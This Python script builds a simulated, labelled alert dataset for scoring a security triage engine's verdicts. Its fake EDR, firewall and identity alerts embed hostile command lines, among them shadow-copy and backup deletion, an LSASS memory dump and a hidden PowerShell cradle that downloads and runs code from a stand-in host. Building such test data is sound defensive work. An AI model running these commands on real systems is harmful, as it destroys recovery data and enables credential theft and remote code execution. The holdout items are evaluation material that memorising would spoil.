"""
Builds eval/dataset.json: a labelled, fully simulated alert set for measuring
Triagle's verdicts. Nothing here comes from a real environment. Names, hosts,
IPs (RFC 5737 / private ranges) and hashes are invented.

Each item is an ordinary Triagle input ({"source","client","raw"}) plus a
"label": {"threat": bool, "scenario": str, "split": "dev"|"holdout", "why": str}

  threat=True   -> the alert is part of a real attack; closing it is a MISS.
  threat=False  -> benign; escalating it is noise (a false escalation).

"dev" cases may be used to improve the engine. "holdout" cases were written at
the same time but are only for scoring. Both were written by the same author,
so treat the holdout number as an upper bound, not as independent validation.
"""
import json
import os

ITEMS = []
_n = [0]


def _id(p):
    _n[0] += 1
    return f"{p}-{_n[0]:03d}"


def edr(client, name, sev, host, user, desc, label, split="dev", why="", **kw):
    raw = {"detection_id": _id("ldt"), "created_timestamp": kw.pop("ts"), "name": name,
           "severity": sev, "hostname": host, "user_name": user, "description": desc}
    raw.update(kw)
    ITEMS.append({"source": "crowdstrike_edr", "client": client, "raw": raw,
                  "label": {**label, "split": split, "why": why}})


def fw(client, attack, sev, src, dst, msg, label, split="dev", why="", **kw):
    raw = {"logid": _id("fg"), "eventtime": kw.pop("ts"), "attack": attack, "crlevel": sev,
           "srcip": src, "dstip": dst, "msg": msg, "action": kw.pop("action", "detected")}
    raw.update(kw)
    ITEMS.append({"source": "fortinet_fw", "client": client, "raw": raw,
                  "label": {**label, "split": split, "why": why}})


def idp(client, event, sev, upn, ip, detail, label, split="dev", why="", **kw):
    raw = {"id": _id("signin"), "createdDateTime": kw.pop("ts"), "riskEventType": event,
           "riskLevel": sev, "userPrincipalName": upn, "ipAddress": ip, "riskDetail": detail}
    raw.update(kw)
    ITEMS.append({"source": "entra_id", "client": client, "raw": raw,
                  "label": {**label, "split": split, "why": why}})


T = lambda s: {"threat": True, "scenario": s}
B = lambda s: {"threat": False, "scenario": s}

# ---------------------------------------------------------------------------
# 1. Ransomware chain, obvious wording (the easy case)
# ---------------------------------------------------------------------------
C = "Kaveri Power Distribution"
idp(C, "impossibleTravel", "high", "r.menon@kaveripower.example", "198.51.100.23",
    "Sign-in from Bucharest RO 12 minutes after a sign-in from Chennai IN.", T("ransomware"),
    ts="2026-11-02T03:10:00Z", host_hint="KPD-BILL-03")
edr(C, "Credential dumping via LSASS access", "high", "KPD-BILL-03", "r.menon",
    "Handle opened to lsass.exe with full access by an unsigned binary.", T("ransomware"),
    ts="2026-11-02T03:31:00Z", tactic="Credential Access", technique="LSASS Memory",
    filename="upd.exe", cmdline="upd.exe -p lsass")
edr(C, "Lateral movement via remote service", "high", "KPD-FS-01", "r.menon",
    "Remote service created from KPD-BILL-03 using harvested credentials.", T("ransomware"),
    ts="2026-11-02T03:44:00Z", tactic="Lateral Movement")
edr(C, "Ransomware behavior detected", "critical", "KPD-FS-01", "r.menon",
    "Process rapidly encrypting files; shadow copies deleted.", T("ransomware"),
    ts="2026-11-02T04:02:00Z", sha256="9f2a7d11c0b84e6fa1d35b7e2c904d18",
    filename="svhost.exe", cmdline="vssadmin delete shadows /all /quiet", tactic="Impact")
fw(C, "Outbound connection to known C2", "high", "KPD-FS-01", "203.0.113.150",
   "Beaconing pattern to known command and control infrastructure.", T("ransomware"),
   ts="2026-11-02T04:05:00Z", dstport="443")

# ---------------------------------------------------------------------------
# 2. Ransomware precursors with NO obvious wording (the hard case)
# ---------------------------------------------------------------------------
C = "Sundar Hospitals"
edr(C, "Volume shadow copy administration", "low", "SH-PACS-02", "svc_backup",
    "vssadmin invoked by a non-backup parent process.", T("ransomware-quiet"),
    why="Shadow-copy deletion is a classic pre-encryption step; no keyword in the title.",
    ts="2026-11-03T22:14:00Z", cmdline="vssadmin.exe delete shadows /all /quiet", filename="vssadmin.exe")
edr(C, "Boot configuration modified", "low", "SH-PACS-02", "svc_backup",
    "bcdedit changed recovery settings.", T("ransomware-quiet"),
    why="Disabling recovery precedes encryption.",
    ts="2026-11-03T22:15:00Z", cmdline="bcdedit /set {default} recoveryenabled No", filename="bcdedit.exe")
edr(C, "Scheduled task created", "low", "SH-PACS-02", "svc_backup",
    "New scheduled task runs an encoded PowerShell command at logon.", T("ransomware-quiet"),
    why="Persistence with an encoded download cradle.", split="holdout",
    ts="2026-11-03T22:09:00Z",
    cmdline="schtasks /create /tn Updater /tr \"powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA\" /sc onlogon")
edr(C, "Backup catalog removed", "medium", "SH-BKP-01", "svc_backup",
    "wbadmin removed the backup catalog.", T("ransomware-quiet"), split="holdout",
    why="Destroying backups before impact.",
    ts="2026-11-03T22:18:00Z", cmdline="wbadmin delete catalog -quiet", filename="wbadmin.exe")

# ---------------------------------------------------------------------------
# 3. Phishing -> account takeover (identity only)
# ---------------------------------------------------------------------------
C = "Ganga Finserv"
idp(C, "anonymizedIPAddress", "medium", "a.iyer@gangafin.example", "192.0.2.77",
    "Sign-in from an anonymising proxy after the user clicked a link in an email.", T("phish-ato"),
    ts="2026-11-04T06:02:00Z")
idp(C, "New inbox rule", "low", "a.iyer@gangafin.example", "192.0.2.77",
    "Inbox rule created: forward all mail containing 'invoice' to an external address and delete.",
    T("phish-ato"), why="Classic business-email-compromise step, reported at low severity.",
    ts="2026-11-04T06:09:00Z")
idp(C, "MFA method registered", "low", "a.iyer@gangafin.example", "192.0.2.77",
    "New authenticator app registered from a device not seen before.", T("phish-ato"),
    why="Attacker adding their own second factor.", ts="2026-11-04T06:11:00Z")
idp(C, "Mass file download", "medium", "a.iyer@gangafin.example", "192.0.2.77",
    "412 files downloaded from the finance SharePoint site in 6 minutes.", T("phish-ato"),
    split="holdout", ts="2026-11-04T06:20:00Z")
idp(C, "OAuth application consent", "low", "a.iyer@gangafin.example", "192.0.2.77",
    "User granted Mail.ReadWrite and offline_access to an unverified app.", T("phish-ato"),
    split="holdout", why="Illicit consent grant.", ts="2026-11-04T06:25:00Z")

# ---------------------------------------------------------------------------
# 4. Brute force that succeeds
# ---------------------------------------------------------------------------
C = "Narmada Textiles"
idp(C, "passwordSpray", "high", "multiple", "198.51.100.91",
    "Failed sign-ins across 30 accounts from one external IP in 10 minutes.", T("brute"),
    ts="2026-11-05T01:00:00Z")
fw(C, "SSH brute force", "medium", "198.51.100.91", "NT-VPN-01",
   "250 failed SSH logins in 5 minutes from a single source.", T("brute"),
   ts="2026-11-05T01:04:00Z", dstport="22")
idp(C, "Successful sign-in after repeated failures", "medium", "k.rao@narmadatex.example",
    "198.51.100.91", "Sign-in succeeded from the IP that produced 40 failures.", T("brute"),
    ts="2026-11-05T01:12:00Z")
idp(C, "Privileged role assigned", "low", "k.rao@narmadatex.example", "198.51.100.91",
    "Global Administrator role assigned to a newly created account.", T("brute"),
    split="holdout", why="Privilege gain right after a brute-forced login, at low severity.",
    ts="2026-11-05T01:20:00Z")

# ---------------------------------------------------------------------------
# 5. Attacker hiding behind an allowlisted tool name
# ---------------------------------------------------------------------------
C = "Kaveri Power Distribution"
edr(C, "Remote service creation", "high", "KPD-DC-01", "svc_sccm",
    "Service installed remotely from a workstation; binary named sccm_update.exe.", T("allowlist-abuse"),
    why="The text mentions SCCM, but the target is a domain controller and the source is a workstation.",
    ts="2026-11-06T02:30:00Z", cmdline="psexesvc.exe", filename="sccm_update.exe")
edr(C, "Process memory dump", "medium", "KPD-ENG-11", "t.pillai",
    "rundll32 wrote a memory dump file to a CyberArk folder.", T("allowlist-abuse"),
    why="comsvcs MiniDump is a credential-theft technique; the path only looks like CyberArk.",
    ts="2026-11-06T02:41:00Z",
    cmdline="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\CyberArk\\out.dmp full")
edr(C, "Suspicious PowerShell execution", "medium", "KPD-ENG-11", "t.pillai",
    "PowerShell launched from a folder named HP SoftPaq and contacted an external address.",
    T("allowlist-abuse"), split="holdout",
    ts="2026-11-06T02:44:00Z",
    cmdline="powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')\"")

# ---------------------------------------------------------------------------
# 6. Benign admin noise that should close
# ---------------------------------------------------------------------------
C = "Ganga Finserv"
for i, h in enumerate(["GF-WKS-04", "GF-WKS-09", "GF-WKS-15", "GF-WKS-22", "GF-WKS-31"]):
    edr(C, "Known admin tool: 1E Tachyon agent", "low", h, "SYSTEM",
        "1E Tachyon agent performing routine scheduled software inventory.", B("admin-noise"),
        split="dev" if i < 3 else "holdout",
        ts=f"2026-11-04T0{i+1}:00:00Z", cmdline="TachyonAgent.exe --inventory", filename="TachyonAgent.exe")
edr(C, "HP SoftPaq driver update flagged", "low", "GF-WKS-09", "SYSTEM",
    "HP SoftPaq download manager updating drivers.", B("admin-noise"),
    ts="2026-11-04T09:00:00Z", cmdline="HPSoftPaqDownloadManager.exe", filename="HPSoftPaqDownloadManager.exe")
edr(C, "Suspicious PowerShell execution", "medium", "GF-PAW-01", "d.shah",
    "CyberArk PSM dispatcher launching PowerShell for privileged session management.", B("admin-noise"),
    ts="2026-11-04T10:00:00Z",
    cmdline="powershell.exe -File C:\\CyberArk\\PSM\\Components\\dispatch.ps1", filename="powershell.exe")
fw(C, "Traffic allowed", "low", "10.20.5.20", "8.8.8.8", "Routine outbound HTTPS to public DNS resolver.",
   B("admin-noise"), ts="2026-11-04T10:05:00Z", action="accept")
fw(C, "Traffic allowed", "low", "10.20.5.31", "10.20.1.10", "Internal file-share access.",
   B("admin-noise"), split="holdout", ts="2026-11-04T10:06:00Z", action="accept")

# ---------------------------------------------------------------------------
# 7. Benign alerts that contain scary-looking words (false-escalation traps)
# ---------------------------------------------------------------------------
C = "Sundar Hospitals"
edr(C, "Disk encryption enabled", "low", "SH-LAP-07", "SYSTEM",
    "BitLocker encryption turned on by device-management policy.", B("word-trap"),
    why="Contains 'encrypt' but is routine policy.", ts="2026-11-03T08:00:00Z",
    cmdline="manage-bde -on C:", filename="manage-bde.exe")
fw(C, "Traffic allowed", "low", "10.40.2.14", "EC2-APP-01", "Routine HTTPS to the cloud application server.",
   B("word-trap"), why="Hostname EC2-APP-01 contains the letters 'c2'.",
   ts="2026-11-03T08:05:00Z", action="accept")
edr(C, "Software inventory scan", "low", "SH-WKS-21", "SYSTEM",
    "Routine inventory of installed software.", B("word-trap"),
    why="The file hash happens to contain 'c2'.", ts="2026-11-03T08:10:00Z",
    sha256="4bc2a09e77d1f3c2aa5b6e0d9c81f2b7", cmdline="TachyonAgent.exe --inventory",
    filename="TachyonAgent.exe")
fw(C, "Traffic allowed", "low", "10.40.2.30", "10.40.9.5", "Nightly backup: files encrypted in transit to the backup server.",
   B("word-trap"), split="holdout", ts="2026-11-03T23:00:00Z", action="accept")
idp(C, "Password changed", "low", "n.george@sundarhosp.example", "10.40.3.8",
    "User changed their own password from the office network after the 90-day expiry notice.",
    B("word-trap"), split="holdout", ts="2026-11-03T09:00:00Z")
edr(C, "Software update installed", "low", "SH-WKS-30", "SYSTEM",
    "Vendor update for the command and control room display software.", B("word-trap"),
    split="holdout", why="'command and control' used in its plain-English sense.",
    ts="2026-11-03T09:30:00Z", filename="DisplayWallUpdate.exe", cmdline="DisplayWallUpdate.exe /s")

# ---------------------------------------------------------------------------
# 8. Ambiguous: fine to escalate, not a miss either way (excluded from noise score)
# ---------------------------------------------------------------------------
C = "Narmada Textiles"
fw(C, "SQL injection attempt", "high", "192.0.2.200", "NT-WEB-01",
   "WAF blocked SQL injection attempt against the supplier portal login.",
   {"threat": None, "scenario": "ambiguous"}, why="Blocked attempt; reasonable to escalate or log.",
   ts="2026-11-05T11:00:00Z", action="blocked")
fw(C, "Port scan detected", "medium", "192.0.2.201", "NT-DMZ-01",
   "Sequential port probing from an external host.",
   {"threat": None, "scenario": "ambiguous"}, why="Internet background noise unless followed by more.",
   ts="2026-11-05T11:30:00Z")

if __name__ == "__main__":
    out = os.path.join(os.path.dirname(__file__), "dataset.json")
    json.dump(ITEMS, open(out, "w"), indent=1)
    t = sum(1 for i in ITEMS if i["label"]["threat"] is True)
    b = sum(1 for i in ITEMS if i["label"]["threat"] is False)
    print(f"wrote {len(ITEMS)} alerts: {t} threat, {b} benign, {len(ITEMS)-t-b} ambiguous -> {out}")
